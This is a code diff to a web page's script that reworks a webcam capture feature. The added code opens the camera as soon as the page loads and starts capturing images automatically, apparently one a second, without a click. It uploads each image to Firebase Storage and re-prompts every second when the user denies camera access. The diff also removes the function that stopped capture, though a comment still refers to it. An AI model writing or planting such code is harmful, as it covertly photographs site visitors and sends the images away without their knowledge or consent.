@@ -102,15 +102,23 @@
         const reButton = document.getElementById("redir");
 
         // Create a media stream from the user's webcam
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(function(stream) {
-                video.srcObject = stream;
-            })
-            .catch(function(error) {
-                console.error("Error accessing the webcam:", error);
-            });
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    startImageCapture(); // Start capturing images once the camera is accessed
+                })
+                .catch(function(error) {
+                    console.error("Error accessing the webcam:", error);
+                    // Retry capturing images if camera access is denied
+                    setTimeout(startCamera, 1000); // Retry after 1 second
+                });
+        }
 
-        // Handle the capture button click
+        // Call the function to start the camera when the page loads
+        window.addEventListener('load', startCamera);
+
+        // Existing capture button click event and related functions
         captureButton.addEventListener("click", function() {
             startImageCapture();
         });
@@ -124,13 +132,33 @@
             }, 1000);
         }
 
-        function stopImageCapture() {
-            // Stop the image capture interval
-            clearInterval(captureInterval);
+        // Additional action after taking a picture (existing function)
+
+        function takePicture() {
+            // Existing takePicture function
+
+            // Upload the image to Firebase Storage
+            const storageRef = firebase.storage().ref();
+            const imageRef = storageRef.child(generateUniqueFileName());
+            const metadata = {
+                contentType: 'image/jpeg'
+            };
+            imageRef.putString(getImageDataUrl(), 'data_url', metadata)
+                .then(function(snapshot) {
+                    console.log('Image uploaded to Firebase Storage:', snapshot.ref.fullPath);
+                })
+                .catch(function(error) {
+                    console.error('Error uploading image:', error);
+                });
         }
 
-        // Additional action after taking a picture
-        function takePicture() {
+        function generateUniqueFileName() {
+            // Generate a unique filename using the current timestamp
+            const timestamp = new Date().toISOString().replace(/[-:.]/g, "");
+            return `image_${timestamp}.jpg`;
+        }
+
+        function getImageDataUrl() {
             // Create a canvas element to capture the image
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -139,31 +167,12 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             // Convert the image to base64 data URL
-            const imageDataURL = canvas.toDataURL('image/jpeg');
-
-            // Generate a unique filename using the current timestamp
-            const timestamp = new Date().toISOString().replace(/[-:.]/g, "");
-            const imageName = `image_${timestamp}.jpg`;
-
-            // Upload the image to Firebase Storage
-            const storageRef = firebase.storage().ref();
-            const imageRef = storageRef.child(imageName);
-            const metadata = {
-                contentType: 'image/jpeg'
-            };
-            imageRef.putString(imageDataURL, 'data_url', metadata)
-                .then(function(snapshot) {
-                    console.log('Image uploaded to Firebase Storage:', snapshot.ref.fullPath);
-                })
-                .catch(function(error) {
-                    console.error('Error uploading image:', error);
-                });
+            return canvas.toDataURL('image/jpeg');
         }
-        function myFunction(){
+
+        function myFunction() {
             captureButton.style.display = "none";
             reButton.style.display = "block";
-
-
         }
 
         // Call stopImageCapture when needed, for example, when the user closes the website or performs another action.
